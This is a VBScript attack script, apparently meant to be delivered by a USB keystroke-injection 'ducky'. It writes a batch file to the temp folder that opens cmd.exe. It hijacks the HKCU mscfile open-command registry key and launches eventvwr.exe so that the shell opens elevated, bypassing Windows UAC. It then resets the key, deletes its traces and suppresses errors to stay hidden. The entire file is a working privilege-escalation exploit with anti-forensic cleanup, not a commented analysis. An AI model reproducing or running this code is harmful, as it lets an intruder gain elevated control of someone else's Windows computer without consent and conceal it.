
Sub Main()


	Dim objFSO, outFile
	Set objFSO = CreateObject("Scripting.FileSystemObject")
'Open write stream
	Set outFile = objFSO.CreateTextFile("cmd.bat", True)

'Write each command line
	outFile.WriteLine "start cmd.exe"
	outFile.WriteLine "DEL ""%~f0"""

'Close write stream
	outFile.Close




'Move file from ducky to local temp folder
	CreateObject("Scripting.FilesystemObject").CopyFile Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\")) + "cmd.bat",  CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) + "\cmd.bat"

'Write UAC bypass regkey
	CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) +"\cmd.bat" ,"REG_SZ"
	
'Trigger UAC bypass
	CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
	
'Reset regkey 
	GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv").DeleteValue &H80000001,"Software\Classes\mscfile\shell\open\command\",""

'Remove this script
	'CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

'Delete batch file
	'CreateObject("WScript.Shell").Run "cmd /c del cmd.bat & pause", 0, False
	CreateObject("WScript.Shell").Exec("cmd.exe /c del cmd.bat")

End Sub
'Dont wanna display shit
On Error Resume Next

  Main


  If Err.Number Then

    'on error cleanup and exit

	'CreateObject("WScript.Shell").Run "cmd /c del " + WScript.ScriptFullName, 0, False

    WScript.Quit 4711

End If